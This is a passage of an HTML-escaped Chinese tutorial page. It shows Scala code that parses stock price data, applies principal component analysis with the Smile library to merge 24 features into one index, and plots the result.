&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateArrayTuples&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;groupedByDate&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-37&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//turn the tuples into two separate arrays for easier use later on&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将这些元组分隔为两个数组以方便之后使用&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateArray&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateArrayTuples&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-41&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubleArray&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateArrayTuples&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-43&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubleArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStockDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split the comma separated value string into an array of strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//把用逗号分隔的数值字符串分解为一个字符串数组&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleDateFormat&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;yyyy-MM-dd&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the values from the strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从字符串中抽取数值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stock&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-60&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-61&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And return the result in a format that can later &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//easily be used to feed to Smile&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//并以一定格式返回结果，使得该结果之后容易输入到Smile中处理&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-64&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b5478301554-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b5478301554-67&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0079 seconds] --&gt;
&lt;p&gt;有了训练数据，并且我们已经知道要将24个特征合并为一个单独的特征，现在我们可以进行主成分分析，并按如下方式为数据点检索数据。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613bf352878068&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Add to `def top`
//添加到‘def top’中
val pca = new PCA(trainData._2)
pca.setProjection(1)
val points = pca.project(trainData._2)
val plotData = points
    .zipWithIndex
    .map(x =&amp;gt; Array(x._2.toDouble, -x._1(0) ))

val canvas: PlotCanvas = LinePlot.plot(&quot;Merged Features Index&quot;,
                                         plotData, 
                                         Line.Style.DASH,
                                         Color.RED);

peer.setContentPane(canvas)
size = new Dimension(400, 400)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613bf352878068-16&quot;&gt;16&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add to `def top`&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//添加到‘def top’中&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pca&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;PCA&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-4&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;pca&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setProjection&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-5&quot;&gt;
